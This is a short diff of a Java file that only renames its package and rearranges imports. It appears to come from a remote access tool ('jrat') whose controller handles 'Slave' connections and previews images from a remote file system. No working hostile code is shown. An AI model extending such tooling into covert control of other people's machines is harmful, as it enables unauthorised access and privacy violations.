@@ -1,9 +1,10 @@
-package jrat.controller.ui.frames;
+package jrat.module.fs.ui;
 
 import iconlib.IconUtils;
 import jrat.controller.Slave;
-import jrat.controller.packets.outgoing.Packet62PreviewImage;
+import jrat.controller.ui.frames.BaseFrame;
 import jrat.controller.ui.panels.PanelImage;
+import jrat.module.fs.packets.Packet62PreviewImage;
 
 import javax.imageio.ImageIO;
 import javax.swing.*;
